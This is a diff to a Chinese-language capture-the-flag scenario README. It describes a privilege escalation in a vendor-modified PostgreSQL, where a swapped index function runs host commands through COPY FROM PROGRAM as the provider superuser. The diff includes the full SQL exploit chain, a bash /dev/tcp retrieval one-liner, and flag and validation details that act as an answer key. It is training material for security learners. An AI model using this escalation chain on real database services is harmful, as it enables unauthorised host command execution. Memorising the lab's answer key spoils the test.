@@ -10,6 +10,8 @@
 | 难度 | L3 |
 | 交付方式 | Docker Compose |
 | 入口 | localhost:10625 |
+| 入口身份 | 宿主侧黑盒起点（无云凭据，需自行派生） |
+| 终点 | 数据库主机 经 flag-vault 交付（network-source：数据库主机地址（provider 超级角色在主机上执行取回）） |
 
 ## 场景概述
 供应商修改了 PostgreSQL 引擎：客户管理员角色（cloudsqluser）拥有
@@ -32,7 +34,8 @@
 > 能以供应商角色执行命令的路径。
 
 ## 利用步骤
-1. 建表并建一个无害 IMMUTABLE 函数和索引（让索引合法建立）：
+
+1. 建表并建一个无害的 IMMUTABLE 函数和索引（让索引合法建立）：
    ```sql
    CREATE TABLE temp_table (data text);
    INSERT INTO temp_table VALUES ('dummy');
@@ -44,18 +47,28 @@
    ```sql
    ALTER TABLE temp_table OWNER TO cloudsqladmin;
    ```
-3. 把函数体换成 VOLATILE 宿主命令：
+3. 把函数体换成 VOLATILE 宿主命令。由于索引函数会以 provider 超级角色在数据库主机上执行，
+   直接在主机上向 flag-vault 取密文（`$p$` 引用避免与外层 `$$` 撞标签）：
    ```sql
    CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS
-     $$ COPY public.shell_commands_results (data) FROM PROGRAM 'cat /host_flag.txt';
+     $$ COPY public.shell_commands_results (data) FROM PROGRAM
+        $p$bash -c "exec 3<>/dev/tcp/flag-vault/5000; printf 'GET /flag HTTP/1.0
+
+' >&3; timeout 5 cat <&3"$p$;
         SELECT 'done' $$ LANGUAGE sql;
    ```
-4. 触发 `ANALYZE public.temp_table;` ——控制台会以 cloudsqladmin 身份
-   重新求值索引函数，命令输出写入 shell_commands_results。
-5. `SELECT * FROM shell_commands_results;` 得到宿主 flag。
+4. 触发 `ANALYZE public.temp_table;`——控制台以 cloudsqladmin 身份重新求值索引函数，命令输出写入
+   `shell_commands_results`。
+5. `SELECT * FROM shell_commands_results;` 得到密文。
 
 ## Flag
-`flag{cloud-14-host-rce}`
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 数据库主机 向 flag-vault 出示「数据库主机地址（provider 超级角色在主机上执行取回）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{cloud-14-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py cloud-14 <flag>`（gate）+
+  `python3 tests/cloud/run.py cloud-14 <flag>`（参考利用）。
 
 ## 此场景利用了哪些知识
 
